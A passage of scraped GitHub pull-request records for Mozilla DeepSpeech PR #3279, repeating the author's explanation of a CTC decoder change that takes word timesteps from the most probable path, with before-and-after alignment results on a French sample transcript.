Since I need to compare the probability of different paths (to keep the timesteps of the most probable one), it is important to compare paths of the same length (eg. paths from the beginning up to the current time). So, exactly the same way as it is done for the probabilities, I need to know the timesteps of the previous time, and store the timesteps of the current time separately.

In the end, timesteps are handled in a way very similar to the way probabilities are handled.

### Results on an example
To evaluate the resulting timesteps, I first take the argmax of my logits. In my example, it gives :
```
tou_________________________________________________ss  les  _a__mouurreuux  de  se_p_ort__ diiivverrr_  ss'enn__ _r_é___j_uuii__rr__on_t____    aa_v_eecc_   l''aap__p_rroo___chhee_____    de_  ll'hhi__v_e_rr____  et   la   rre__p_rri_ssee  dee  la  c_ouppee ddu  mon_deee      ss__kk_i___      less    ii_mm_a__ggees_   de   _g_ll_i_ss__ssee____________________             ree__t_rrou_vveennt    uunee    __pllaa___cee____      de    _cchhooixx__  d_ans_  lles  _pp_a____ggeess        ssspp_o_r_t_ii_vees_  de  v_o_s_ _jourrnnaauxx  ttéé_l_é___v_ii___ss_é__s__      ddeeu_x_   __é___pprreeuu_vvees___________________          _auu_jjoouurrdd''hhuuii___       _o____nno___rr_o_____d__a___mm________ ___s___a_n______t__a______  _q__a___tt__e___rr_i____n__a_____     __p_r____mmie_r__  s__a___l__o___m___    _g_é____ant__  de   lla  _c_ou_ppee  ddu   m_on___deee____________________________________________________
```
As the logits are the only input of the decoder, I base my evaluation on them instead of comparing with the audio file directly. It is known that the CTC loss does not guarantee alignment between the audio file and the logits, so the best thing the decoder can do is to fit the logits as best as it can. This is reasonable because, in practice, the logits are aligned quite well with the audio file.

Then, for each word, I take the part of the logits corresponding to the output timesteps, take the argmax (as said above), and print the corresponding decoded text. 

Finally, I assume that good timesteps should lead to a good match between the word and its corresponding text decoded from the argmax of the logits.

Before this PR, the result in my example is (text between slashes is from the logits argmax, spaces are trimmed) : 
```
[WordScoreRange(word=tous /tou/, score=None, ranges=((0, 4),)),   
 WordScoreRange(word=les /les/, score=None, ranges=((55, 59),)),       
 WordScoreRange(word=amoureux /amoureu/, score=None, ranges=((60, 74),)),
 WordScoreRange(word=de /d/, score=None, ranges=((75, 78),)),           
 WordScoreRange(word=sport /seport/, score=None, ranges=((80, 90),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((91, 102),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((103, 111),)),  
 WordScoreRange(word=réjouiront /réjuiron/, score=None, ranges=((112, 136),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((141, 153),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((155, 179),)),
 WordScoreRange(word=de /de/, score=None, ranges=((185, 191),)),  
 WordScoreRange(word=l'hiver /l'hive/, score=None, ranges=((192, 206),)),
 WordScoreRange(word=et /e/, score=None, ranges=((208, 215),)),
 WordScoreRange(word=la /la/, score=None, ranges=((217, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((222, 238),)),
 WordScoreRange(word=de /de/, score=None, ranges=((240, 243),)),
 WordScoreRange(word=la /la/, score=None, ranges=((244, 248),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((249, 257),)),
 WordScoreRange(word=du /d/, score=None, ranges=((258, 261),)),
 WordScoreRange(word=monde /monde/, score=None, ranges=((263, 270),)),
 WordScoreRange(word=de /e/, score=None, ranges=((271, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((276, 286),)),
 WordScoreRange(word=les /les/, score=None, ranges=((290, 298),)),
 WordScoreRange(word=images /image/, score=None, ranges=((300, 316),)),
 WordScoreRange(word=de /d/, score=None, ranges=((318, 322),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((324, 341),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((363, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((395, 402),)),
 WordScoreRange(word=place /place/, score=None, ranges=((404, 419),)),
 WordScoreRange(word=de /de/, score=None, ranges=((425, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((433, 445),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((448, 455),)),
 WordScoreRange(word=les /les/, score=None, ranges=((457, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((463, 478),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((479, 506),)),
 WordScoreRange(word=de /de/, score=None, ranges=((508, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((512, 518),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((520, 532),)),
 WordScoreRange(word=télévisés /télévisé/, score=None, ranges=((533, 559),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((563, 575),)),
 WordScoreRange(word=épreuves /épreuve/, score=None, ranges=((577, 598),)),
 WordScoreRange(word=aujourd'hui /aujourd'hu/, score=None, ranges=((618, 649),)),
 WordScoreRange(word=on /o/, score=None, ranges=((654, 665),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 756),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((762, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((805, 818),)),
 WordScoreRange(word=de /d/, score=None, ranges=((819, 823),)),
 WordScoreRange(word=la /l/, score=None, ranges=((825, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((831, 841),)),
 WordScoreRange(word=du /d/, score=None, ranges=((842, 846),)),
 WordScoreRange(word=monde /mon/, score=None, ranges=((848, 857),))]
```

After this PR, the result in my example is : 
```
[WordScoreRange(word=tous /tous/, score=None, ranges=((0, 54),)), 
 WordScoreRange(word=les /les/, score=None, ranges=((56, 59),)),        
 WordScoreRange(word=amoureux /amoureux/, score=None, ranges=((62, 75),)),
 WordScoreRange(word=de /de/, score=None, ranges=((77, 79),)),          
 WordScoreRange(word=sport /seport/, score=None, ranges=((81, 91),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((92, 103),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((105, 113),)),  
 WordScoreRange(word=réjouiront /réjuiront/, score=None, ranges=((114, 140),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((145, 155),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((158, 185),)),
 WordScoreRange(word=de /de/, score=None, ranges=((189, 192),)),  
 WordScoreRange(word=l'hiver /l'hiver/, score=None, ranges=((194, 212),)),
 WordScoreRange(word=et /et/, score=None, ranges=((214, 216),)),                                                               
 WordScoreRange(word=la /la/, score=None, ranges=((219, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((224, 239),)),                                                                                                                         
 WordScoreRange(word=de /de/, score=None, ranges=((241, 244),)),            
 WordScoreRange(word=la /la/, score=None, ranges=((246, 248),)),              
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((250, 258),)),
 WordScoreRange(word=du /du/, score=None, ranges=((259, 262),)),            
 WordScoreRange(word=monde /monde/, score=None, ranges=((264, 272),)),
 WordScoreRange(word=de //, score=None, ranges=((273, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((278, 289),)),
 WordScoreRange(word=les /les/, score=None, ranges=((295, 299),)),
 WordScoreRange(word=images /images/, score=None, ranges=((303, 318),)),
 WordScoreRange(word=de /de/, score=None, ranges=((321, 323),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((327, 362),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((375, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((398, 403),)),
 WordScoreRange(word=place /place/, score=None, ranges=((409, 424),)),
 WordScoreRange(word=de /de/, score=None, ranges=((430, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((437, 448),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((450, 456),)),
 WordScoreRange(word=les /les/, score=None, ranges=((458, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((465, 479),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((487, 507),)),
 WordScoreRange(word=de /de/, score=None, ranges=((509, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((513, 519),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((521, 533),)),
 WordScoreRange(word=télévisés /télévisés/, score=None, ranges=((535, 562),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((568, 576),)),
 WordScoreRange(word=épreuves /épreuves/, score=None, ranges=((581, 618),)),
 WordScoreRange(word=aujourd'hui /aujourd'hui/, score=None, ranges=((629, 654),)),
 WordScoreRange(word=on /onoro/, score=None, ranges=((662, 680),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 761),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((768, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((808, 820),)),
 WordScoreRange(word=de /de/, score=None, ranges=((822, 824),)),
 WordScoreRange(word=la /l/, score=None, ranges=((826, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((833, 842),)),
 WordScoreRange(word=du /d/, score=None, ranges=((843, 846),)),
 WordScoreRange(word=monde /mond/, score=None, ranges=((850, 858),))]
```

We can see that before this PR, there are 17 words where timesteps are too early (about one letter shift, it is visible at the end but not at the begining of words because I have trimed spaces).
After this PR, the fit is almost prefect. For some reason, there are still 3 remaining errors, all in the 4 last words.",godefv,18540039,2020-08-25T11:03:55Z,COLLABORATOR,True,277,31,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f07c10452bfea8be7c1bdaa4fda925dd48e77ecc,PR #3279 - use unique_ptr instead of shared_ptr in the timestep tree
564,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3279,3279,"The CTC decoder timesteps now corresponds to the timesteps of the most probable CTC path, instead of the earliest timesteps of all possible paths.","This follows the issue #3180 .

I suggest a new way of handling timesteps produced by the CTC decoder. There is no strange heuristic, and I think the logic is clear : when fusing two different paths leading to the same prefix, not only fuse the probabilities (the probabilities are added), but also fuse the timestep sequences (for the last letter in the sequence, choose the timestep from the most probable path).

The place where two different paths leading to the same prefix are fused are the places where `log_sum_exp` is called, because this function fuses the probabilities. So, timesteps would now be fused at the same places.

The other change is that each `PathTrie` node would now store the full sequence of timesteps. This is because one prefix can be an ancestor of another and their timesteps on a given node can differ. Having the full sequence of timesteps in each node, we have no need to duplicate a node with different timesteps, and it is much simpler like that. 
Moreover, it makes sense to store the *full* sequence of timesteps, because the *combined* probabilities are also stored there. The total probability is not the sum of the probability of each output token, and, in the same way, the correct sequence of timesteps is not the concatenation of the timestep of each output token.

Since I need to compare the probability of different paths (to keep the timesteps of the most probable one), it is important to compare paths of the same length (eg. paths from the beginning up to the current time). So, exactly the same way as it is done for the probabilities, I need to know the timesteps of the previous time, and store the timesteps of the current time separately.

In the end, timesteps are handled in a way very similar to the way probabilities are handled.

### Results on an example
To evaluate the resulting timesteps, I first take the argmax of my logits. In my example, it gives :
```
tou_________________________________________________ss  les  _a__mouurreuux  de  se_p_ort__ diiivverrr_  ss'enn__ _r_é___j_uuii__rr__on_t____    aa_v_eecc_   l''aap__p_rroo___chhee_____    de_  ll'hhi__v_e_rr____  et   la   rre__p_rri_ssee  dee  la  c_ouppee ddu  mon_deee      ss__kk_i___      less    ii_mm_a__ggees_   de   _g_ll_i_ss__ssee____________________             ree__t_rrou_vveennt    uunee    __pllaa___cee____      de    _cchhooixx__  d_ans_  lles  _pp_a____ggeess        ssspp_o_r_t_ii_vees_  de  v_o_s_ _jourrnnaauxx  ttéé_l_é___v_ii___ss_é__s__      ddeeu_x_   __é___pprreeuu_vvees___________________          _auu_jjoouurrdd''hhuuii___       _o____nno___rr_o_____d__a___mm________ ___s___a_n______t__a______  _q__a___tt__e___rr_i____n__a_____     __p_r____mmie_r__  s__a___l__o___m___    _g_é____ant__  de   lla  _c_ou_ppee  ddu   m_on___deee____________________________________________________
```
As the logits are the only input of the decoder, I base my evaluation on them instead of comparing with the audio file directly. It is known that the CTC loss does not guarantee alignment between the audio file and the logits, so the best thing the decoder can do is to fit the logits as best as it can. This is reasonable because, in practice, the logits are aligned quite well with the audio file.

Then, for each word, I take the part of the logits corresponding to the output timesteps, take the argmax (as said above), and print the corresponding decoded text. 

Finally, I assume that good timesteps should lead to a good match between the word and its corresponding text decoded from the argmax of the logits.

Before this PR, the result in my example is (text between slashes is from the logits argmax, spaces are trimmed) : 
```
[WordScoreRange(word=tous /tou/, score=None, ranges=((0, 4),)),   
 WordScoreRange(word=les /les/, score=None, ranges=((55, 59),)),       
 WordScoreRange(word=amoureux /amoureu/, score=None, ranges=((60, 74),)),
 WordScoreRange(word=de /d/, score=None, ranges=((75, 78),)),           
 WordScoreRange(word=sport /seport/, score=None, ranges=((80, 90),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((91, 102),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((103, 111),)),  
 WordScoreRange(word=réjouiront /réjuiron/, score=None, ranges=((112, 136),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((141, 153),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((155, 179),)),
 WordScoreRange(word=de /de/, score=None, ranges=((185, 191),)),  
 WordScoreRange(word=l'hiver /l'hive/, score=None, ranges=((192, 206),)),
 WordScoreRange(word=et /e/, score=None, ranges=((208, 215),)),
 WordScoreRange(word=la /la/, score=None, ranges=((217, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((222, 238),)),
 WordScoreRange(word=de /de/, score=None, ranges=((240, 243),)),
 WordScoreRange(word=la /la/, score=None, ranges=((244, 248),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((249, 257),)),
 WordScoreRange(word=du /d/, score=None, ranges=((258, 261),)),
 WordScoreRange(word=monde /monde/, score=None, ranges=((263, 270),)),
 WordScoreRange(word=de /e/, score=None, ranges=((271, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((276, 286),)),
 WordScoreRange(word=les /les/, score=None, ranges=((290, 298),)),
 WordScoreRange(word=images /image/, score=None, ranges=((300, 316),)),
 WordScoreRange(word=de /d/, score=None, ranges=((318, 322),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((324, 341),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((363, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((395, 402),)),
 WordScoreRange(word=place /place/, score=None, ranges=((404, 419),)),
 WordScoreRange(word=de /de/, score=None, ranges=((425, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((433, 445),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((448, 455),)),
 WordScoreRange(word=les /les/, score=None, ranges=((457, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((463, 478),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((479, 506),)),
 WordScoreRange(word=de /de/, score=None, ranges=((508, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((512, 518),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((520, 532),)),
 WordScoreRange(word=télévisés /télévisé/, score=None, ranges=((533, 559),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((563, 575),)),
 WordScoreRange(word=épreuves /épreuve/, score=None, ranges=((577, 598),)),
 WordScoreRange(word=aujourd'hui /aujourd'hu/, score=None, ranges=((618, 649),)),
 WordScoreRange(word=on /o/, score=None, ranges=((654, 665),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 756),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((762, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((805, 818),)),
 WordScoreRange(word=de /d/, score=None, ranges=((819, 823),)),
 WordScoreRange(word=la /l/, score=None, ranges=((825, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((831, 841),)),
 WordScoreRange(word=du /d/, score=None, ranges=((842, 846),)),
 WordScoreRange(word=monde /mon/, score=None, ranges=((848, 857),))]
```

After this PR, the result in my example is : 
```
[WordScoreRange(word=tous /tous/, score=None, ranges=((0, 54),)), 
 WordScoreRange(word=les /les/, score=None, ranges=((56, 59),)),        
 WordScoreRange(word=amoureux /amoureux/, score=None, ranges=((62, 75),)),
 WordScoreRange(word=de /de/, score=None, ranges=((77, 79),)),          
 WordScoreRange(word=sport /seport/, score=None, ranges=((81, 91),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((92, 103),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((105, 113),)),  
 WordScoreRange(word=réjouiront /réjuiront/, score=None, ranges=((114, 140),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((145, 155),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((158, 185),)),
 WordScoreRange(word=de /de/, score=None, ranges=((189, 192),)),  
 WordScoreRange(word=l'hiver /l'hiver/, score=None, ranges=((194, 212),)),
 WordScoreRange(word=et /et/, score=None, ranges=((214, 216),)),                                                               
 WordScoreRange(word=la /la/, score=None, ranges=((219, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((224, 239),)),                                                                                                                         
 WordScoreRange(word=de /de/, score=None, ranges=((241, 244),)),            
 WordScoreRange(word=la /la/, score=None, ranges=((246, 248),)),              
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((250, 258),)),
 WordScoreRange(word=du /du/, score=None, ranges=((259, 262),)),            
 WordScoreRange(word=monde /monde/, score=None, ranges=((264, 272),)),
 WordScoreRange(word=de //, score=None, ranges=((273, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((278, 289),)),
 WordScoreRange(word=les /les/, score=None, ranges=((295, 299),)),
 WordScoreRange(word=images /images/, score=None, ranges=((303, 318),)),
 WordScoreRange(word=de /de/, score=None, ranges=((321, 323),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((327, 362),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((375, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((398, 403),)),
 WordScoreRange(word=place /place/, score=None, ranges=((409, 424),)),
 WordScoreRange(word=de /de/, score=None, ranges=((430, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((437, 448),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((450, 456),)),
 WordScoreRange(word=les /les/, score=None, ranges=((458, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((465, 479),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((487, 507),)),
 WordScoreRange(word=de /de/, score=None, ranges=((509, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((513, 519),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((521, 533),)),
 WordScoreRange(word=télévisés /télévisés/, score=None, ranges=((535, 562),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((568, 576),)),
 WordScoreRange(word=épreuves /épreuves/, score=None, ranges=((581, 618),)),
 WordScoreRange(word=aujourd'hui /aujourd'hui/, score=None, ranges=((629, 654),)),
 WordScoreRange(word=on /onoro/, score=None, ranges=((662, 680),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 761),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((768, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((808, 820),)),
 WordScoreRange(word=de /de/, score=None, ranges=((822, 824),)),
 WordScoreRange(word=la /l/, score=None, ranges=((826, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((833, 842),)),
 WordScoreRange(word=du /d/, score=None, ranges=((843, 846),)),
 WordScoreRange(word=monde /mond/, score=None, ranges=((850, 858),))]
```

We can see that before this PR, there are 17 words where timesteps are too early (about one letter shift, it is visible at the end but not at the begining of words because I have trimed spaces).
After this PR, the fit is almost prefect. For some reason, there are still 3 remaining errors, all in the 4 last words.",godefv,18540039,2020-08-25T11:03:55Z,COLLABORATOR,True,277,31,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,15ce05aa01f86ce129b5b03240b1bd33491042cc,PR #3279 - Fixed spaces
565,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3279,3279,"The CTC decoder timesteps now corresponds to the timesteps of the most probable CTC path, instead of the earliest timesteps of all possible paths.","This follows the issue #3180 .

I suggest a new way of handling timesteps produced by the CTC decoder. There is no strange heuristic, and I think the logic is clear : when fusing two different paths leading to the same prefix, not only fuse the probabilities (the probabilities are added), but also fuse the timestep sequences (for the last letter in the sequence, choose the timestep from the most probable path).

The place where two different paths leading to the same prefix are fused are the places where `log_sum_exp` is called, because this function fuses the probabilities. So, timesteps would now be fused at the same places.

The other change is that each `PathTrie` node would now store the full sequence of timesteps. This is because one prefix can be an ancestor of another and their timesteps on a given node can differ. Having the full sequence of timesteps in each node, we have no need to duplicate a node with different timesteps, and it is much simpler like that. 
Moreover, it makes sense to store the *full* sequence of timesteps, because the *combined* probabilities are also stored there. The total probability is not the sum of the probability of each output token, and, in the same way, the correct sequence of timesteps is not the concatenation of the timestep of each output token.

Since I need to compare the probability of different paths (to keep the timesteps of the most probable one), it is important to compare paths of the same length (eg. paths from the beginning up to the current time). So, exactly the same way as it is done for the probabilities, I need to know the timesteps of the previous time, and store the timesteps of the current time separately.

In the end, timesteps are handled in a way very similar to the way probabilities are handled.

### Results on an example
To evaluate the resulting timesteps, I first take the argmax of my logits. In my example, it gives :
```
tou_________________________________________________ss  les  _a__mouurreuux  de  se_p_ort__ diiivverrr_  ss'enn__ _r_é___j_uuii__rr__on_t____    aa_v_eecc_   l''aap__p_rroo___chhee_____    de_  ll'hhi__v_e_rr____  et   la   rre__p_rri_ssee  dee  la  c_ouppee ddu  mon_deee      ss__kk_i___      less    ii_mm_a__ggees_   de   _g_ll_i_ss__ssee____________________             ree__t_rrou_vveennt    uunee    __pllaa___cee____      de    _cchhooixx__  d_ans_  lles  _pp_a____ggeess        ssspp_o_r_t_ii_vees_  de  v_o_s_ _jourrnnaauxx  ttéé_l_é___v_ii___ss_é__s__      ddeeu_x_   __é___pprreeuu_vvees___________________          _auu_jjoouurrdd''hhuuii___       _o____nno___rr_o_____d__a___mm________ ___s___a_n______t__a______  _q__a___tt__e___rr_i____n__a_____     __p_r____mmie_r__  s__a___l__o___m___    _g_é____ant__  de   lla  _c_ou_ppee  ddu   m_on___deee____________________________________________________
```
As the logits are the only input of the decoder, I base my evaluation on them instead of comparing with the audio file directly. It is known that the CTC loss does not guarantee alignment between the audio file and the logits, so the best thing the decoder can do is to fit the logits as best as it can. This is reasonable because, in practice, the logits are aligned quite well with the audio file.

Then, for each word, I take the part of the logits corresponding to the output timesteps, take the argmax (as said above), and print the corresponding decoded text. 

Finally, I assume that good timesteps should lead to a good match between the word and its corresponding text decoded from the argmax of the logits.

Before this PR, the result in my example is (text between slashes is from the logits argmax, spaces are trimmed) : 
```
[WordScoreRange(word=tous /tou/, score=None, ranges=((0, 4),)),   
 WordScoreRange(word=les /les/, score=None, ranges=((55, 59),)),       
 WordScoreRange(word=amoureux /amoureu/, score=None, ranges=((60, 74),)),
 WordScoreRange(word=de /d/, score=None, ranges=((75, 78),)),           
 WordScoreRange(word=sport /seport/, score=None, ranges=((80, 90),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((91, 102),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((103, 111),)),  
 WordScoreRange(word=réjouiront /réjuiron/, score=None, ranges=((112, 136),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((141, 153),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((155, 179),)),
 WordScoreRange(word=de /de/, score=None, ranges=((185, 191),)),  
 WordScoreRange(word=l'hiver /l'hive/, score=None, ranges=((192, 206),)),
 WordScoreRange(word=et /e/, score=None, ranges=((208, 215),)),
 WordScoreRange(word=la /la/, score=None, ranges=((217, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((222, 238),)),
 WordScoreRange(word=de /de/, score=None, ranges=((240, 243),)),
 WordScoreRange(word=la /la/, score=None, ranges=((244, 248),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((249, 257),)),
 WordScoreRange(word=du /d/, score=None, ranges=((258, 261),)),
 WordScoreRange(word=monde /monde/, score=None, ranges=((263, 270),)),
 WordScoreRange(word=de /e/, score=None, ranges=((271, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((276, 286),)),
 WordScoreRange(word=les /les/, score=None, ranges=((290, 298),)),
 WordScoreRange(word=images /image/, score=None, ranges=((300, 316),)),
 WordScoreRange(word=de /d/, score=None, ranges=((318, 322),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((324, 341),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((363, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((395, 402),)),
 WordScoreRange(word=place /place/, score=None, ranges=((404, 419),)),
 WordScoreRange(word=de /de/, score=None, ranges=((425, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((433, 445),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((448, 455),)),
 WordScoreRange(word=les /les/, score=None, ranges=((457, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((463, 478),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((479, 506),)),
 WordScoreRange(word=de /de/, score=None, ranges=((508, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((512, 518),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((520, 532),)),
 WordScoreRange(word=télévisés /télévisé/, score=None, ranges=((533, 559),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((563, 575),)),
 WordScoreRange(word=épreuves /épreuve/, score=None, ranges=((577, 598),)),
 WordScoreRange(word=aujourd'hui /aujourd'hu/, score=None, ranges=((618, 649),)),
 WordScoreRange(word=on /o/, score=None, ranges=((654, 665),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 756),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((762, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((805, 818),)),
 WordScoreRange(word=de /d/, score=None, ranges=((819, 823),)),
 WordScoreRange(word=la /l/, score=None, ranges=((825, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((831, 841),)),
 WordScoreRange(word=du /d/, score=None, ranges=((842, 846),)),
 WordScoreRange(word=monde /mon/, score=None, ranges=((848, 857),))]
```

After this PR, the result in my example is : 
```
[WordScoreRange(word=tous /tous/, score=None, ranges=((0, 54),)), 
 WordScoreRange(word=les /les/, score=None, ranges=((56, 59),)),        
 WordScoreRange(word=amoureux /amoureux/, score=None, ranges=((62, 75),)),
 WordScoreRange(word=de /de/, score=None, ranges=((77, 79),)),          
 WordScoreRange(word=sport /seport/, score=None, ranges=((81, 91),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((92, 103),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((105, 113),)),  
 WordScoreRange(word=réjouiront /réjuiront/, score=None, ranges=((114, 140),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((145, 155),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((158, 185),)),
 WordScoreRange(word=de /de/, score=None, ranges=((189, 192),)),  
 WordScoreRange(word=l'hiver /l'hiver/, score=None, ranges=((194, 212),)),
 WordScoreRange(word=et /et/, score=None, ranges=((214, 216),)),                                                               
 WordScoreRange(word=la /la/, score=None, ranges=((219, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((224, 239),)),                                                                                                                         
 WordScoreRange(word=de /de/, score=None, ranges=((241, 244),)),            
 WordScoreRange(word=la /la/, score=None, ranges=((246, 248),)),              
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((250, 258),)),
 WordScoreRange(word=du /du/, score=None, ranges=((259, 262),)),            
 WordScoreRange(word=monde /monde/, score=None, ranges=((264, 272),)),
 WordScoreRange(word=de //, score=None, ranges=((273, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((278, 289),)),
 WordScoreRange(word=les /les/, score=None, ranges=((295, 299),)),
 WordScoreRange(word=images /images/, score=None, ranges=((303, 318),)),
 WordScoreRange(word=de /de/, score=None, ranges=((321, 323),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((327, 362),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((375, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((398, 403),)),
 WordScoreRange(word=place /place/, score=None, ranges=((409, 424),)),
 WordScoreRange(word=de /de/, score=None, ranges=((430, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((437, 448),)),
